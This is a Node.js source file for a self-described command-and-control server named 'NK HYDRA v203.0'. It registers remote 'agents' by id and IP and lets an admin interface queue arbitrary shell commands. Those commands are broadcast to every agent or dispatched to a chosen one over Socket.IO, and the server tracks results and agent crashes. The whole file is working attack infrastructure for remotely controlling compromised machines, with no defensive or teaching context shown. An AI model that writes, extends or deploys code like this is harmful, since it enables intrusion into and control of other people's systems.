// TYPE: NODE.JS C2 SERVER
// NK HYDRA v203.0 [DISPATCH CONFIRMATION]

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();
app.use(cors());

// Health Check
app.get('/health', (req, res) => { res.status(200).send('OK'); });
app.get('/', (req, res) => { 
    res.json({ status: 'online', version: 'v203.0', agents: agents.length }); 
});

const server = http.createServer(app);
const io = new Server(server, { 
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingInterval: 10000, 
    pingTimeout: 40000, 
    maxHttpBufferSize: 1e8, 
    transports: ['polling', 'websocket'] 
});

let agents = []; 
const commandQueue = [];
let adminSocket = null; 
const activeCommands = new Map();

const logToAdmin = (level, message, details = {}) => {
    if (adminSocket) {
        adminSocket.emit('agent_event', {
            type: 'TELEMETRY',
            agentId: 'C2_KERNEL',
            payload: { timestamp: Date.now(), source: 'C2', level, message, details }
        });
    }
    console.log(`[${level}] ${message}`);
};

let isProcessingQueue = false;
const processQueue = async () => {
    if (isProcessingQueue || commandQueue.length === 0) return;
    isProcessingQueue = true;

    while (commandQueue.length > 0) {
        const task = commandQueue.shift();
        if (task) {
            try {
                if (task.targetId === 'all') {
                    io.emit('exec_cmd', { cmd: task.cmd, id: task.id });
                    logToAdmin('INFO', 'Broadcast Sent', { cmd: task.cmd });
                } else {
                    const agent = agents.find(a => a.id === task.targetId);
                    if (agent && agent.socketId) {
                         // LOG DISPATCH
                         logToAdmin('INFO', `Dispatching to ${agent.id}`, { cmd: task.cmd, socketId: agent.socketId });
                         
                         io.to(agent.socketId).emit('exec_cmd', { cmd: task.cmd, id: task.id });
                         
                         activeCommands.set(agent.socketId, { cmd: task.cmd, start: Date.now() });
                    } else {
                        logToAdmin('WARNING', 'Agent Not Found for Task', { target: task.targetId });
                    }
                }
            } catch (e) {
                logToAdmin('ERROR', 'Queue Failed', { error: e.message });
            }
        }
        await new Promise(r => setTimeout(r, 100)); 
    }
    isProcessingQueue = false;
};

io.on('connection', (socket) => {
    
    socket.on('identify', (data) => {
        if (data.type === 'ui') {
            socket.join('ui_room');
            adminSocket = socket;
            socket.emit('agents_list', agents);
            logToAdmin('SUCCESS', 'Admin UI Connected');
            return;
        }
        
        // Remove old instance
        agents = agents.filter(a => a.id !== data.id);
        
        const newAgent = { ...data, socketId: socket.id, status: 'Online', lastSeen: Date.now() };
        agents.push(newAgent);
        
        io.to('ui_room').emit('agents_list', agents);
        logToAdmin('SUCCESS', `Agent Online: ${data.id}`, { ip: data.ip });
        
        if(commandQueue.length > 0) processQueue();
    });

    socket.on('exec_cmd', (data) => {
        logToAdmin('INFO', 'Command Queued via UI', { cmd: data.cmd });
        commandQueue.push({ ...data, id: Date.now().toString() });
        processQueue();
    });
    
    socket.on('agent_event', (data) => {
        if (data.type === 'SUCCESS' || data.type === 'ERROR') {
             const agent = agents.find(a => a.id === data.agentId);
             if (agent) activeCommands.delete(agent.socketId);
        }
        io.to('ui_room').emit('agent_event', data);
    });

    socket.on('disconnect', (reason) => {
        const agent = agents.find(a => a.socketId === socket.id);
        if (agent) { 
            agent.status = 'Offline'; 
            io.to('ui_room').emit('agents_list', agents);
            
            const lastCmd = activeCommands.get(socket.id);
            if (lastCmd) {
                logToAdmin('CRITICAL', 'AGENT CRASH DETECTED', { 
                    reason: `Agent disconnected while executing: ${lastCmd.cmd}`,
                    possible_cause: 'Memory Overflow or Socket Timeout',
                    recommendation: 'Use output redirection.'
                });
                activeCommands.delete(socket.id);
            }
        } else if (socket === adminSocket) {
            adminSocket = null;
        }
    });
    
    socket.on('heartbeat', () => {
        const agent = agents.find(a => a.socketId === socket.id);
        if (agent) agent.lastSeen = Date.now();
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`HYDRA v203 LISTENING ON ${PORT}`));
